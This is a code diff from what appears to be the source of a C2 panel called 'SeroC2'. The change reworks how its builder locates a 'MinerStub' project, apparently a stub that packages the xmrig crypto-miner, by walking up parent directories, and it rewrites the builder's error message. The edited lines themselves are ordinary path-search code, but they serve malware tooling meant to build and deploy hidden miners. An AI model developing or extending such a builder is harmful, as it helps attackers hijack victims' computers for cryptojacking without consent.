@@ -1881,18 +1881,26 @@ internal static class Config
     private string GetMinerStubProjectDir()
     {
         var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
-        var candidates = new[]
+
+        // Walk up to 6 parent levels and scan each level's subdirectories for MinerStub.csproj.
+        // This way the folder can be named anything — folder name is irrelevant.
+        var dir = serverExeDir;
+        for (int i = 0; i <= 6; i++)
         {
-            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "miner-stub"),
-            Path.Combine(serverExeDir, "..", "..", "..", "..", "miner-stub"),
-            Path.Combine(serverExeDir, "..", "miner-stub"),
-        };
-        foreach (var c in candidates)
-        {
-            var full = Path.GetFullPath(c);
-            if (Directory.Exists(full)) return full;
+            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) break;
+            try
+            {
+                foreach (var sub in Directory.GetDirectories(dir))
+                {
+                    if (File.Exists(Path.Combine(sub, "MinerStub.csproj")))
+                        return sub;
+                }
+            }
+            catch { }
+            dir = Path.GetDirectoryName(dir);
         }
-        return candidates[0];
+
+        return ""; // not found
     }
 
     private void AutoDetectXmrig()
@@ -1976,9 +1984,9 @@ internal static class MinerConfig
     private async void BldMnrBuild_Click(object sender, RoutedEventArgs e)
     {
         var minerDir = GetMinerStubProjectDir();
-        if (!Directory.Exists(minerDir))
+        if (string.IsNullOrEmpty(minerDir) || !Directory.Exists(minerDir))
         {
-            TxtMnrBuildStatus.Text = $"Error: miner-stub/ not found at {minerDir}";
+            TxtMnrBuildStatus.Text = "Error: MinerStub project not found. Place the miner-stub folder (containing MinerStub.csproj) next to the server exe or in the SeroC2 root directory.";
             return;
         }
         if (_bldXmrigBytes == null || _bldXmrigBytes.Length == 0)
